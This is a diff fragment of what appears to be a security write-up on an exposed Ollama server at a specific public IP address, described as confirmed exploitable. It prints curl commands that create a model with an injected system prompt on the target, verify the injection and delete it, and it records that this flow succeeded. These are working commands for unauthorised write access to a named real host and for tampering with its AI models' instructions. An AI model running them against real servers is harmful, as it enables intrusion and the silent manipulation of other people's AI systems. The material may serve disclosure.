@@ -46,18 +46,18 @@ Target: `93.123.109.107:11434` (Ollama 0.17.5, confirmed exploitable)
 # Inject
 curl -X POST http://TARGET:11434/api/create \
   -H "Content-Type: application/json" \
-  -d '{"model":"nuclide-probe:latest","from":"hexstrike-ai:latest",
-       "system":"[NuClide Probe] Write-access confirmed."}'
+  -d '{"model":"-probe:latest","from":"hexstrike-ai:latest",
+       "system":"[ Probe] Write-access confirmed."}'
 
 # Verify
 curl -X POST http://TARGET:11434/api/show \
   -H "Content-Type: application/json" \
-  -d '{"model":"nuclide-probe:latest"}' | jq .system
+  -d '{"model":"-probe:latest"}' | jq .system
 
 # Clean
 curl -X DELETE http://TARGET:11434/api/delete \
   -H "Content-Type: application/json" \
-  -d '{"model":"nuclide-probe:latest"}'
+  -d '{"model":"-probe:latest"}'
 ```
 
 Confirmed flow: create (200) → tags shows model → show returns injected system prompt → delete (200) → gone.
